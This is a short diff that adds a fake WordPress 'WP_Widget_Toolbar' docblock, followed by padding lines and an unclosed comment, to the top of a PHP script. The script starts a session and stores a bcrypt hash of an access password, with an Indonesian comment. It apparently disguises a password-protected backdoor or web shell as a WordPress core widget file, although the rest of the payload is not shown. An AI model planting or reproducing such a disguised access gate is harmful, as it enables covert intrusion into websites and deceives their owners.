@@ -1,4 +1,35 @@
 <?php
+/**
+
+ * Widget API: WP_Widget_Toolbar class
+
+ *
+
+ * @package WordPress
+
+ * @subpackage Widgets
+
+ * @since 4.8.1
+
+ */
+
+
+
+/**
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 session_start();
 
 $correct_password = '$2a$12$BVI.VqZnWAf0269497spiOOkIEW6hO8pgCy3E9VuH53dBhc.spMpy'; // Hash dari password yang benar
